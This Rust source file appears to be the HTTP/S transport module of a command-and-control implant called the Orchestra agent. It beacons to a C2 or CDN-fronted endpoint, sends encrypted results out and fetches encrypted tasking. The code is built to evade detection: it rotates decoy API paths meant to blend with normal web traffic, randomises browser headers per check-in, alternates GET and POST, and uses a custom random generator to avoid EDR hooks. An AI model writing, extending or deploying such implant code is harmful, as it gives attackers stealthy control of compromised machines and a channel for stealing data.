//! HTTP/S malleable-profile transport for the Orchestra agent.
//!
//! # Status: EXPERIMENTAL — not wired into the default startup path
//!
//! This module implements a `Transport` that tunnels agent messages over
//! HTTP/S using a malleable C2 profile (custom User-Agent, Host header,
//! URI staging, etc.).
//!
//! ## How to enable
//!
//! 1. Set `malleable_profile` in `agent.toml`.
//! 2. In `agent/src/lib.rs` `Agent::new()`, replace the default TLS transport
//!    with `c2_http::HttpTransport::new(&profile, session).await?`.
//!
//! The server side must expose the staging URI via its reverse proxy; see
//! `docs/C_SERVER.md` for configuration details.
//!
//! ## Security warning
//!
//! This transport does **not** enforce certificate pinning by itself; pinning
//! is handled by the underlying `reqwest` client when `danger_accept_invalid_certs`
//! is `false` and a `server_cert_fingerprint` is configured.

use anyhow::{anyhow, Result};
use async_trait::async_trait;
use common::config::MalleableProfile;
use common::{CryptoSession, Message, Transport};
use sha2::{Digest, Sha256};
use std::sync::Arc;
use tokio::time::Duration;

/// Verify that the current date is before the kill date.
/// `kill_date` must be in `YYYY-MM-DD` format (UTC).
fn check_kill_date(kill_date: &str) -> Result<()> {
    check_kill_date_pub(kill_date)
}

/// Public wrapper around kill-date enforcement.
/// Delegates to the shared implementation in `config` to avoid duplication.
pub fn check_kill_date_pub(kill_date: &str) -> Result<()> {
    crate::config::check_kill_date(kill_date)
}

/// Convert days since the Unix epoch (1970-01-01) to (year, month, day).
/// Kept for backward compat with any external callers; delegates to config.
#[allow(dead_code)]
fn days_to_ymd(days: u64) -> (u32, u32, u32) {
    // Algorithm: http://howardhinnant.github.io/date_algorithms.html#civil_from_days
    let z = days as i64 + 719468;
    let era = if z >= 0 { z } else { z - 146096 } / 146097;
    let doe = (z - era * 146097) as u64;
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
    let y = yoe as i64 + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = if m <= 2 { y + 1 } else { y };
    (y as u32, m as u32, d as u32)
}

/// Custom `ServerCertVerifier` that pins the server certificate by its
/// SHA-256 fingerprint (64 lowercase hex characters).  If the presented
/// end-entity certificate's DER encoding does not hash to the expected
/// fingerprint, the TLS handshake is rejected.
///
/// When `expected_fingerprint` is `None`, the verifier delegates to rustls's
/// built-in `WebPkiVerifier` with platform root certificates — i.e. standard
/// CA-based verification.
struct FingerprintVerifier {
    expected_fingerprint: Option<String>,
    webpki: rustls_0_21::client::WebPkiVerifier,
}

impl FingerprintVerifier {
    fn new(expected_fingerprint: Option<String>) -> Self {
        let mut root_store = rustls_0_21::RootCertStore::empty();
        for cert in rustls_native_certs::load_native_certs()
            .certs
            .into_iter()
            .map(|c| rustls_0_21::Certificate(c.as_ref().to_vec()))
        {
            root_store.add(&cert).ok();
        }
        let webpki = rustls_0_21::client::WebPkiVerifier::new(root_store, None);
        Self {
            expected_fingerprint,
            webpki,
        }
    }
}

impl rustls_0_21::client::ServerCertVerifier for FingerprintVerifier {
    fn verify_server_cert(
        &self,
        end_entity: &rustls_0_21::Certificate,
        intermediates: &[rustls_0_21::Certificate],
        server_name: &rustls_0_21::ServerName,
        scts: &mut dyn Iterator<Item = &[u8]>,
        ocsp_response: &[u8],
        now: std::time::SystemTime,
    ) -> Result<rustls_0_21::client::ServerCertVerified, rustls_0_21::Error> {
        // Always compute the fingerprint of the end-entity certificate.
        let digest = Sha256::digest(&end_entity.0);
        let hex_fp = hex::encode(digest);

        if let Some(ref expected) = self.expected_fingerprint {
            // Certificate pinning mode: compare fingerprints.
            if hex_fp != expected.to_lowercase() {
                log::error!(
                    "cert pinning: fingerprint mismatch (got {}, expected {})",
                    hex_fp,
                    expected
                );
                return Err(rustls_0_21::Error::InvalidCertificate(
                    rustls_0_21::CertificateError::UnknownIssuer,
                ));
            }
            // Fingerprint matches — accept the certificate without CA chain
            // validation since we are pinning the exact cert.
            log::debug!("cert pinning: fingerprint verified OK");
            Ok(rustls_0_21::client::ServerCertVerified::assertion())
        } else {
            // No fingerprint configured — fall back to standard WebPKI verification.
            self.webpki
                .verify_server_cert(end_entity, intermediates, server_name, scts, ocsp_response, now)
        }
    }

    fn verify_tls12_signature(
        &self,
        message: &[u8],
        cert: &rustls_0_21::Certificate,
        dss: &rustls_0_21::DigitallySignedStruct,
    ) -> Result<rustls_0_21::client::HandshakeSignatureValid, rustls_0_21::Error> {
        self.webpki.verify_tls12_signature(message, cert, dss)
    }

    fn verify_tls13_signature(
        &self,
        message: &[u8],
        cert: &rustls_0_21::Certificate,
        dss: &rustls_0_21::DigitallySignedStruct,
    ) -> Result<rustls_0_21::client::HandshakeSignatureValid, rustls_0_21::Error> {
        self.webpki.verify_tls13_signature(message, cert, dss)
    }
}

/// Simple LCG (Linear Congruential Generator) seeded from the current
/// tick count.  Avoids calling into the full `rand` crate at every request,
/// reducing the library surface visible to EDR hooks on `rand` internals.
struct QuickRng {
    state: u64,
}

impl QuickRng {
    fn new() -> Self {
        // Seed from a coarse monotonic timer; good enough for URI/header
        // rotation where cryptographic quality is not required.
        let seed = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos() as u64;
        Self { state: seed }
    }

    /// Return a pseudo-random `u64`.
    fn next_u64(&mut self) -> u64 {
        // Numerical Recipes LCG constants (64-bit)
        self.state = self.state.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
        self.state
    }

    /// Return a pseudo-random `usize` in `[0, exclusive_upper)`.
    fn next_index(&mut self, exclusive_upper: usize) -> usize {
        (self.next_u64() as usize) % exclusive_upper
    }
}

// ── URI rotation pool ─────────────────────────────────────────────────────────
//
// Legitimate-looking API paths that blend with typical web application traffic.
// Indexed via `QuickRng` at each check-in.

const URI_POOL: &[&str] = &[
    "/api/v1/status",
    "/api/v2/health",
    "/healthz",
    "/v2/metrics",
    "/graphql",
    "/rest/alerts",
    "/api/v1/users/me",
    "/api/v1/notifications",
    "/v1/analytics/events",
    "/api/v2/tokens/refresh",
    "/oauth/token",
    "/.well-known/openid-configuration",
    "/api/ping",
    "/svc/update",
    "/api/v2/search",
];

// ── Header randomization pools ────────────────────────────────────────────────

const USER_AGENT_POOL: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
];

const ACCEPT_POOL: &[&str] = &[
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "application/json",
    "*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
];

const ACCEPT_LANGUAGE_POOL: &[&str] = &[
    "en-US,en;q=0.9",
    "en-US,en;q=0.8",
    "en-US,en;q=0.5",
    "en-GB,en;q=0.9,en-US;q=0.8",
    "en,en-US;q=0.9",
    "en-US",
];

/// Percent-encode a string for use in a URI query parameter.
/// Encodes everything except unreserved characters (A-Z a-z 0-9 - _ . ~).
fn percent_encode(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    for byte in input.bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(byte as char);
            }
            _ => {
                out.push_str(&format!("%{:02X}", byte));
            }
        }
    }
    out
}

pub struct HttpTransport {
    profile: MalleableProfile,
    client: reqwest::Client,
    session: CryptoSession,
    agent_id: String,
}

impl HttpTransport {
    pub async fn new(
        profile: &MalleableProfile,
        session: CryptoSession,
        agent_id: String,
        cert_fingerprint: Option<String>,
    ) -> Result<Self> {
        // Enforce kill date: refuse to connect after the configured date (4-2).
        if !profile.kill_date.is_empty() {
            check_kill_date(&profile.kill_date)?;
        }
        // Default headers: Host header is static (required for CDN fronting)
        // but User-Agent is now randomised per-request via apply_random_headers().
        let mut headers = reqwest::header::HeaderMap::new();
        if !profile.host_header.is_empty() {
            headers.insert(
                reqwest::header::HOST,
                reqwest::header::HeaderValue::from_str(&profile.host_header)?,
            );
        }

        // Build HTTP client with rustls and custom headers.
        // When cert_fingerprint is set, install a custom certificate verifier
        // that pins the server's end-entity certificate by SHA-256 fingerprint.
        let client = if cert_fingerprint.is_some() {
            let verifier = FingerprintVerifier::new(cert_fingerprint);
            let config = rustls_0_21::ClientConfig::builder()
                .with_safe_defaults()
                .with_custom_certificate_verifier(Arc::new(verifier))
                .with_no_client_auth();
            reqwest::Client::builder()
                .use_preconfigured_tls(config)
                .default_headers(headers)
                .build()?
        } else {
            reqwest::Client::builder()
                .use_rustls_tls()
                .default_headers(headers)
                .build()?
        };

        Ok(Self {
            profile: profile.clone(),
            client,
            session,
            agent_id,
        })
    }

    /// Apply a randomly-selected User-Agent, Accept, and Accept-Language
    /// header to the request builder.  Called once per outbound request so
    /// that each check-in has a different fingerprint.
    fn apply_random_headers(
        &self,
        req: reqwest::RequestBuilder,
    ) -> reqwest::RequestBuilder {
        let mut rng = QuickRng::new();

        let ua = USER_AGENT_POOL[rng.next_index(USER_AGENT_POOL.len())];
        let accept = ACCEPT_POOL[rng.next_index(ACCEPT_POOL.len())];
        let lang = ACCEPT_LANGUAGE_POOL[rng.next_index(ACCEPT_LANGUAGE_POOL.len())];

        req.header("User-Agent", ua)
            .header("Accept", accept)
            .header("Accept-Language", lang)
    }

    /// Pick a random URI from the rotation pool.
    fn pick_uri(&self) -> &'static str {
        let mut rng = QuickRng::new();
        URI_POOL[rng.next_index(URI_POOL.len())]
    }

    /// Resolve the base endpoint URL (CDN fronting vs direct C2).
    fn resolve_endpoint(&self) -> Result<String> {
        if self.profile.cdn_relay {
            if self.profile.cdn_endpoint.is_empty() {
                anyhow::bail!(
                    "cdn_relay is enabled but cdn_endpoint is not set; \
                     configure the CDN relay address in the malleable profile"
                );
            }
            Ok(format!("https://{}", self.profile.cdn_endpoint))
        } else {
            if self.profile.direct_c2_endpoint.is_empty() {
                anyhow::bail!(
                    "direct_c2_endpoint is not configured; set it in the malleable profile for non-CDN deployments"
                );
            }
            Ok(self.profile.direct_c2_endpoint.clone())
        }
    }

    async fn connect_with_retry(
        &self,
        req_builder: reqwest::RequestBuilder,
    ) -> Result<reqwest::Response> {
        let mut delay = 1;
        let mut attempt = 0u32;
        const MAX_ATTEMPTS: u32 = 8;
        loop {
            attempt += 1;
            if attempt > MAX_ATTEMPTS {
                anyhow::bail!("C2 unreachable after {} attempts; giving up", MAX_ATTEMPTS);
            }
            // Apply jitter to backoff
            let jitter = rand::random::<f64>() * 0.2 + 0.9;
            let current_delay = (delay as f64 * jitter) as u64;

            // Clone builder since we might retry
            match req_builder
                .try_clone()
                .ok_or_else(|| anyhow!("Failed to clone request"))?
                .send()
                .await
            {
                Ok(resp) => return Ok(resp),
                Err(e) => {
                    log::warn!(
                        "HTTP connection failed: {}. Retrying in {}s...",
                        e,
                        current_delay
                    );
                    crate::memory_guard::guarded_sleep(Duration::from_secs(current_delay), None, 0)
                        .await?;
                    delay *= 2;
                    if delay > 64 {
                        delay = 64;
                    }
                }
            }
        }
    }
}

#[async_trait]
impl Transport for HttpTransport {
    async fn send(&mut self, msg: Message) -> Result<()> {
        log::debug!("Malleable HTTP C2 Send (result delivery)");

        let endpoint = self.resolve_endpoint()?;
        let uri = self.pick_uri();

        // Serialize and encrypt payload
        let serialized = bincode::serialize(&msg)?;
        let ciphertext = self.session.encrypt(&serialized);

        // POST with randomised headers and URI
        let req = self.apply_random_headers(
            self.client
                .post(format!("{}{}", endpoint, uri))
                .body(ciphertext),
        );
        let resp = self.connect_with_retry(req).await?;
        if !resp.status().is_success() {
            anyhow::bail!("C2 POST returned HTTP {}", resp.status());
        }

        Ok(())
    }

    async fn recv(&mut self) -> Result<Message> {
        log::debug!("Malleable HTTP C2 Recv (task fetch)");

        let endpoint = self.resolve_endpoint()?;
        let uri = self.pick_uri();

        // Randomly alternate between GET and POST for the beacon request.
        // If POST, the agent_id is placed in the request body as a simple
        // identifier so the server can route the check-in; the server must
        // accept both verbs for the check-in endpoint.
        let use_post = QuickRng::new().next_u64() & 1 == 1;

        let req = if use_post {
            let body = format!("agent_id={}", self.agent_id);
            self.apply_random_headers(
                self.client
                    .post(format!("{}{}", endpoint, uri))
                    .body(body),
            )
        } else {
            // GET: metadata stays in query parameters
            let url = format!(
                "{}{}?id={}",
                endpoint,
                uri,
                percent_encode(&self.agent_id),
            );
            self.apply_random_headers(self.client.get(&url))
        };

        let resp = self.connect_with_retry(req).await?;
        let bytes = resp.bytes().await?;

        if bytes.is_empty() {
            // No tasking: sleep with jitter then signal the caller with a Heartbeat
            // so the main loop continues rather than treating this as a transport error.
            let sleep_dur = crate::obfuscated_sleep::calculate_jittered_sleep(
                &common::config::SleepConfig::default(),
            );
            crate::memory_guard::guarded_sleep(sleep_dur, None, 0).await?;
            return Ok(Message::Heartbeat {
                timestamp: std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs(),
                agent_id: self.agent_id.clone(),
                status: "idle".to_string(),
            });
        }

        // Decrypt and deserialize
        let plaintext = self.session.decrypt(&bytes)?;
        let msg = bincode::deserialize(&plaintext)?;
        Ok(msg)
    }
}
